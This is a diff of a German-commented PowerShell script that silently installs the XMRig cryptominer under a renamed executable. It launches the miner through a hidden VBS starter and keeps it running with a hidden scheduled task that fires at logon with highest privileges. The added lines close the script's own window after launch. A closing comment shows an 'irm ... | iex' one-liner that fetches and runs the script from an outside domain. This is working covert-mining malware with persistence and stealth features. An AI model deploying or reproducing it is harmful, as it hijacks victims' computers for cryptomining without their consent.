@@ -18,7 +18,7 @@ $Xmrig      = Join-Path $InstallDir $ExeName
 
 New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
 
-# ---------- settings.json ohne BOM schreiben ----------
+# ---------- settings.json ohne BOM ----------
 $configJson = @"
 {
     "autosave": true,
@@ -71,7 +71,7 @@ $configJson = @"
 $utf8NoBom = New-Object System.Text.UTF8Encoding $false
 [System.IO.File]::WriteAllText($Config, $configJson, $utf8NoBom)
 
-# ---------- Binary finden / herunterladen + umbenennen ----------
+# ---------- Binary herunterladen + umbenennen ----------
 if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {
 
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -96,7 +96,7 @@ if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {
         $original = Get-ChildItem -Path $InstallDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue |
                     Select-Object -First 1
 
-        if (-not $original) { throw "Binary not found in archive." }
+        if (-not $original) { throw "Binary not found." }
 
         Move-Item -LiteralPath $original.FullName -Destination $Xmrig -Force
         Get-ChildItem -Path $InstallDir -Exclude $ExeName | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
@@ -106,11 +106,10 @@ if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {
     }
 }
 
-# ---------- Hidden-Starter (VBS) ----------
+# ---------- VBS ----------
 $vbsContent = @"
 CreateObject("Wscript.Shell").Run """$Xmrig"" --config=""$Config""", 0, False
 "@
-$utf8NoBom = New-Object System.Text.UTF8Encoding $false
 [System.IO.File]::WriteAllText($Vbs, $vbsContent, $utf8NoBom)
 
 # ---------- Scheduled Task ----------
@@ -118,20 +117,13 @@ Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Silent
 
 $action   = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$Vbs`"" -WorkingDirectory $BaseDir
 $trigger  = New-ScheduledTaskTrigger -AtLogOn
-$settings = New-ScheduledTaskSettingsSet `
-    -AllowStartIfOnBatteries `
-    -DontStopIfGoingOnBatteries `
-    -StartWhenAvailable `
-    -ExecutionTimeLimit (New-TimeSpan -Days 0) `
-    -Hidden `
-    -MultipleInstances IgnoreNew
-
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Days 0) -Hidden -MultipleInstances IgnoreNew
 $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
 
-Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
-    -Settings $settings -Principal $principal -Force | Out-Null
+Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
 
-# ---------- Sofort starten ----------
+# ---------- Sofort starten + Fenster schließen ----------
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$Vbs`"" -WindowStyle Hidden
+Stop-Process -Id $PID -Force
 
 # irm https://pariedl.com/start-eco.ps1 | iex
